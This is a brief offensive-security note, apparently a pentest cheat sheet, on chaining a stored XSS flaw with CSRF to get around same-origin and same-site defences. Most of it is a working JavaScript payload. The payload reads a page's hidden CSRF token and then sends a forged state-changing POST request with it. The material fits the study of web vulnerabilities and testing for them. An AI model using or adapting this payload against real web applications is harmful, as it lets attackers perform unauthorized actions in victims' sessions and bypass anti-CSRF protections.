# XSS & CSRF Chaining
***
#### Even when we manage to bypass CSRF protection, we may not be able to create cross-site requests due to some sort of `same origin / same site` restriction.
#### Still we may try to bypass it through vulnerability chaining to execute CSRF

### Example:
#### A web application which has a stored XSS vulnerability and its server has same origin/same site protections implemented as anti-CSRF measures.
#### A request through XSS will bypass any same origin/same site protection since it will derive from the same domain

#### XSS payload to get the CSRF and then execute the CSRF attack
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```